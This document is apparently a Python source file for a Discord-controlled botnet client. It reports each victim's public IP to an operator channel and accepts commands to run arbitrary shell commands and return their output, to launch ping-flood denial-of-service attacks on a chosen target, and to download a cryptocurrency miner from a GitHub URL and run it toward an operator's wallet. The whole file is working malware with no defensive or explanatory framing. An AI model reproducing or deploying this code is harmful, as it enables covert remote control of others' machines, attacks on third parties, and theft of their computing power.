from discord.ext import commands
from discord import app_commands
from tendo import singleton
from pathlib import Path
import subprocess
import requests
import discord
import pathlib
import shutil
import psutil
import sys
import os

token = '' #Token
channel_id =  #ChannelID

# sinlge proccess
me = singleton.SingleInstance()

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
temp = os.getenv('temp')
ip = requests.get('https://api.ipify.org').text.strip()
file_name = os.path.basename(__file__)

def process_exists(process_name):
    progs = str(subprocess.check_output('tasklist'))
    if process_name in progs:
        return True
    else:
        return False

# ram info
total_ram = psutil.virtual_memory().total
mram = int(str(total_ram / 2)[0])

# cd temp
os.chdir(temp)

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[+] {ip}: Session opened``")


# ----- Bot Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``--> {ip}``")

# kill
@bot.command()
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    sys.exit()
    os.popen(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command()
async def ddos(ctx, arg1, arg2):
    ddosip = ''.join(arg1)
    ddosbyte = ''.join(arg2)
    os.popen(f"ping {ddosip} -t -l {ddosbyte}")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    if process_exists('ping.exe'):
        os.popen("taskkill /F /IM ping.exe /T")
        await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command()
async def miner(ctx, arg1):
    # Download files
    isExist = os.path.exists("hellminer.exe")
    if not isExist:
        url = "https://github.com/rxu7s/Public/raw/main/hellminer.exe"
        response = requests.get(url)
        open("hellminer.exe", "wb").write(response.content)
        
    isExist = os.path.exists("verus-solver")
    if not isExist:
        url = "https://github.com/rxu7s/Public/raw/main/verus-solver"
        response = requests.get(url)
        open("verus-solver", "wb").write(response.content)
        
    # Check Procces
    if process_exists('hellminer.exe'):
        os.popen("taskkill /F /IM hellminer.exe /T")
        
    if process_exists('verus-solver'):
        os.popen("taskkill /F /IM verus-solver /T")
        
    # Start
    wallet = ''.join(arg1)
    os.popen(f"hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u {wallet}.x -p x --cpu {mram}")
        
    if process_exists('hellminer.exe'):
        await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if process_exists('hellminer.exe'):
        if process_exists('verus-solver'):
            os.popen("taskkill /F /IM hellminer.exe /T")
            await ctx.send(f"``[-] {ip}: Miner stoped``")
            
    if process_exists('verus-solver'):
        os.popen("taskkill /F /IM verus-solver /T")


# ----- Self Commands ----- #

# kill
@bot.command(name="kill." + ip)
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    sys.exit()
    os.popen(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command(name="shell." + ip)
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command(name="ddos." + ip)
async def ddos(ctx, arg1, arg2):
    ddosip = ''.join(arg1)
    ddosbyte = ''.join(arg2)
    os.popen(f"ping {ddosip} -t -l {ddosbyte}")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")
    
# stop ddos
@bot.command(name="stopddos." + ip)
async def stopddos(ctx):
    if process_exists('ping.exe'):
        os.popen("taskkill /F /IM ping.exe /T")
        await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command(name="miner." + ip)
async def miner(ctx, arg1):
    # Download files
    isExist = os.path.exists("hellminer.exe")
    if not isExist:
        url = "https://github.com/rxu7s/Public/raw/main/hellminer.exe"
        response = requests.get(url)
        open("hellminer.exe", "wb").write(response.content)
        
    isExist = os.path.exists("verus-solver")
    if not isExist:
        url = "https://github.com/rxu7s/Public/raw/main/verus-solver"
        response = requests.get(url)
        open("verus-solver", "wb").write(response.content)
        
    # Check Procces
    if process_exists('hellminer.exe'):
        os.popen("taskkill /F /IM hellminer.exe /T")
        
    if process_exists('verus-solver'):
        os.popen("taskkill /F /IM verus-solver /T")
        
    # Start
    wallet = ''.join(arg1)
    os.popen(f"hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u {wallet}.x -p x --cpu {mram}")
        
    if process_exists('hellminer.exe'):
        await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command(name="stopminer." + ip)
async def stopminer(ctx):
    if process_exists('hellminer.exe'):
        if process_exists('verus-solver'):
            os.popen("taskkill /F /IM hellminer.exe /T")
            await ctx.send(f"``[-] {ip}: Miner stoped``")
            
    if process_exists('verus-solver'):
        os.popen("taskkill /F /IM verus-solver /T")

bot.run(token)